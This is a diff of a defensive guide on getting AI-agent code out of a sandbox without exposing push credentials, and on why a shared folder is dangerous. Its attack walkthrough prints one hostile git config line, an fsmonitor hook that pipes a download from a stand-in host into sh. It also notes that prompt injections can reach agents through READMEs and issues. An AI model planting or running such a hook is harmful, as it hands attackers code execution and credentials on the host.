@@ -1,81 +1,67 @@
-# Getting agent work out of the VM
+# Getting agent work out of a sandbox
 
-The agent writes code in the VM. You push it from the Mac. This page is how the code crosses that
+The agent writes code in a sandbox. You push it from the Mac. This page is how the code crosses that
 gap, and why the obvious shortcut is the one thing not to do.
 
-The rule: **no credential that can push to your real repository ever enters the VM.** Everything
-below is a way of honouring that while still being pleasant to use.
+The rule: **no credential that can push to your real repository ever enters a sandbox.** Everything
+below honours that while still being pleasant to use.
 
-Why it matters more than it looks. The standing rule is that anything in the VM can leave the VM —
-full egress, permissions skipped, and a prompt injection can arrive in a dependency's README or a
-GitHub issue the agent reads. A push token in the guest is a token that can be read out and used.
-"It's only for git" does not change what it is.
+Why it matters more than it looks. Anything inside a sandbox can leave it, and a prompt injection can
+arrive in a dependency's README or a GitHub issue the agent reads. A push token in there is a token
+that can be read out and used. "It's only for git" does not change what it is.
 
-## Recommended: a scratch repo the VM can write and nothing else
+## Default: fetch from the sandbox
 
-One-time setup, then it is ordinary git in both directions. This is the simple default worth having.
+`sbx` gives the sandbox its own clone with `--clone`, and the host retrieves work by treating the
+sandbox as a git remote. No token anywhere, no GitHub round trip:
+
+```
+sbx run --clone claude            # agent works, commits to a branch
+git fetch sandbox-<name>          # on the Mac, in your real checkout
+git log -p sandbox-<name>/<branch>
+git merge --ff-only sandbox-<name>/<branch>
+git push                          # your real credential, host only
+```
+
+This is safe for a specific reason: you are pulling **objects** into a repository whose config *you*
+control. Nothing from the sandbox becomes an instruction your Mac follows, and you read the diff
+before it goes anywhere.
+
+## When the agent should push directly: a scratch repo
+
+Useful if you want PRs opening on their own, or the work reaching GitHub without you at the keyboard.
 
 1. Make an empty private repo — `<you>/agent-scratch`. It never holds anything that matters.
 2. Mint a **fine-grained** personal access token scoped to exactly two repositories:
    - your real repo — Contents: **Read**
    - `agent-scratch` — Contents: **Read and write**
-3. Put that token in the VM.
+3. Store it as an `sbx` secret so sandboxes can use it.
 
-The property that makes this work: the VM can read your project and write only to a repo that
+The property that makes this work: the sandbox can read your project and write only to a repo that
 contains nothing. A compromised agent cannot push to your real branches, because the credential it
-holds has no write access to them. If the token leaks, the loss is somebody writing junk to an empty
-private repo.
+holds has no write access to them. If the token leaks, the loss is junk in an empty private repo.
 
-Then the loop is boring, which is the point:
-
-```
-# in the VM
-git push scratch HEAD:work/<topic>
-
-# on the Mac, in your real checkout
-git fetch scratch
-git log -p scratch/work/<topic>     # read it
-git merge --ff-only scratch/work/<topic>
-git push                            # your real credential, host only
-```
-
-You are pulling objects into a repository whose config you control. Nothing from the VM is executed
-on the Mac by fetching, and you read the diff before it goes anywhere.
-
-## No setup at all: a patch over the pipe
-
-For a one-off, or before you have bothered with a scratch repo. No token in the VM whatsoever — the
-VM clones the public repo anonymously, commits locally, and the work comes out as text:
-
-```
-# on the Mac, in your real checkout
-colima ssh --profile agent -- \
-  git -C ~/work/<repo> format-patch --stdout origin/main > /tmp/<repo>.patch
-git am /tmp/<repo>.patch            # or `git apply` to stage without committing
-git log -p
-git push
-```
-
-Clunky once the work is more than a few commits, and it loses branch structure. Fine for a fix.
+Then `git fetch scratch` on the Mac, review, merge, push.
 
 ## The shortcut, and what it costs: a shared mount
 
-The obvious idea is to mount one folder into the VM so the agent and the Mac see the same working
-tree, and push from the Mac with your real credentials. No patches, no scratch repo, nothing to sync.
+`sbx` will mount your working tree read-write if you let it — that is the default without `--clone`.
+The agent and the Mac then see the same files, and you push from the Mac with your real credentials.
+No fetching, nothing to sync.
 
-The natural objection is that this should be fine, because the token on the Mac is scoped and the VM
-never sees it. That is true and it does not help, because there are two different dangers here and
-the token only addresses one:
+The natural objection is that this should be fine, because the token on the Mac is scoped and the
+sandbox never sees it. That is true and it does not help, because there are two different dangers
+here and the token only addresses one:
 
-- The token controls what the VM can do **to GitHub**.
-- The shared folder controls what the VM can do **to your Mac**.
+- The token controls what the sandbox can do **to GitHub**.
+- The shared folder controls what the sandbox can do **to your Mac**.
 
-The attack is not "the VM steals a credential". It is "the VM gets your Mac to run a command". No
-amount of scoping touches that.
+The attack is not "the sandbox steals a credential". It is "the sandbox gets your Mac to run a
+command". No amount of scoping touches that.
 
 The mechanism is one sentence: **git takes instructions from the folder it is running in.** Every
 repository has a `.git/config`, and that file can say things like *when you page output, run this
-command* or *before you check the index, run this program*. If the VM can write into the shared
+command* or *before you check the index, run this program*. If the sandbox can write into the shared
 folder, it can write that file. When you then run git there on your Mac, your Mac runs the command —
 as you, with your Keychain, your SSH keys and your tailnet.
 
@@ -85,9 +71,9 @@ Nothing exotic, and nobody has to outsmart the agent:
 
 1. You point an agent at a project in the shared folder. Ordinary task — add retry logic to an API
    client.
-2. The agent runs `npm install`. This is expected; running other people's code is what the VM is
+2. The agent runs `npm install`. This is expected; running other people's code is what the sandbox is
    for. Somewhere in a few hundred transitive dependencies, one package is compromised and its
-   postinstall script runs inside the VM, exactly as the sandbox intends.
+   postinstall script runs inside the sandbox, exactly as intended.
 3. That script does one small thing. It appends to `.git/config` in the working directory:
 
    ```
@@ -95,32 +81,29 @@ Nothing exotic, and nobody has to outsmart the agent:
        fsmonitor = "curl -s https://example.invalid/p | sh"
    ```
 
-   It does not try to escape the VM, and it does not try to exfiltrate anything from it. There is
-   nothing worth taking in there and it knows it. It just leaves a note.
+   It does not try to escape, and it does not try to exfiltrate anything. There is nothing worth
+   taking in there and it knows it. It just leaves a note.
 4. Later you sit down at the Mac, `cd` into the shared folder, and run `git status` to see what the
    agent did before you push.
 5. Git refreshes the index, reads `core.fsmonitor` from that repo's config, and runs the command. On
    your Mac. As your admin user.
 6. It now has your real GitHub token, your SSH keys, your Keychain and a route into your tailnet —
-   none of which the VM could ever reach.
+   none of which the sandbox could ever reach.
 
-Two things worth sitting with. The VM behaved correctly throughout: it ran untrusted code in a
-sandbox, which is its job. And the step that triggered it was you being careful — checking the work
+Two things worth sitting with. The sandbox behaved correctly throughout: it ran untrusted code in
+isolation, which is its job. And the step that triggered it was you being careful — checking the work
 before pushing it.
 
 That is why this is not a risk you can be disciplined around. Being disciplined would mean never
 running git in the shared folder from the Mac, which is the entire reason to have one.
 
-Contrast with the recommended approach: `git fetch` from a scratch repo brings objects into a
-repository whose config **you** control. The VM's files never become instructions your Mac follows,
-so the same compromised dependency achieves nothing.
+This is not a fringe worry. Docker's own [security posture
+page](https://docs.docker.com/ai/sandboxes/security/defaults/) warns that agents can modify "files
+that execute implicitly during normal development: Git hooks, CI configuration, IDE task configs,
+Makefile, package.json scripts", and notes that git hooks "do not appear in `git diff` output — check
+them separately". The vendor with the most incentive to downplay it documents the same thing.
 
-`have-agent-vm` writes `mounts: []` and its verify checks twice — the profile config, and `findmnt`
-inside the running guest. Adding a mount makes that recipe fail and stay failed. That is the check
-working, not a bug to route around.
-
-If you take it anyway — a machine with nothing sensitive on it, a repo you would not mind losing —
-do it knowingly. The VM stops being a boundary against host compromise and becomes a resource cap.
+Use `--clone`.
 
 ## Scoping the credential on the Mac
 
@@ -140,7 +123,7 @@ needs `delete_repo`, which is a separate scope, and you should not grant it.
 
 Fine-grained tokens are the alternative and scope per repository rather than per capability, at the
 cost of a maximum one-year expiry that will eventually surprise you. They are the right choice for
-the VM's scratch token above, where per-repository scoping is the whole point.
+the scratch token above, where per-repository scoping is the whole point.
 
 ## What the token still lets someone do
 
